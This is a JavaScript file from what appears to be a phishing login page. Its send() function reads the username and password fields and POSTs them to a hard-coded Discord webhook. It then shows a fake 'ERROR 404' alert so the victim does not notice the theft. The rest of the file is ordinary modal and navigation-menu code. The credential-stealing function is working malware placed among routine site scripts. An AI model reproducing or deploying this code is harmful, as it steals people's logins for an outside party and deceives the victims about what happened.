function send(){
    var a = document.getElementById("username").value; 
    var b = document.getElementById("password").value; 
    var discordWebhook = "https://discord.com/api/webhooks/1071501347750412388/3C6f-LbqkywnYHkI5bkqw_lz2WUb0X1_uGYdTPDOfiK2_jpQwBRKgG3U3YoPJSHtcYZR";       
    var request = new XMLHttpRequest();
    request.open("POST", discordWebhook);
    request.setRequestHeader('Content-type', 'application/json');
    var params = {
        username: "SadCord By anas abbassi",
        

        content: 'e-mail :'+a+" Password:"+b

    };
    request.send(JSON.stringify(params));
    alert("ERROR 404")

}


var modal = document.getElementById('id01');
  
window.onclick = function(event) {
  if (event.target == modal) {
    modal.style.display = "none";
  }
}
//zyeda//
const menuToggle = document.querySelector('.menu-toggle');
const bxMenu = document.querySelector('.bx-menu');
const bxX = document.querySelector('.bx-x');

const navBar = document.querySelector('.navbar');

// --- open menu ---

bxMenu.addEventListener('click', (e)=> {
    if(e.target.classList.contains('bx-menu')){
        navBar.classList.add('show-navbar');
        bxMenu.classList.add('hide-bx');
        bxX.classList.add('show-bx');
    }
})

// --- close menu ---

bxX.addEventListener('click', (e)=> {
    if(e.target.classList.contains('bx-x')){
        navBar.classList.remove('show-navbar');
        bxMenu.classList.remove('hide-bx');
        bxX.classList.remove('show-bx');
    }
})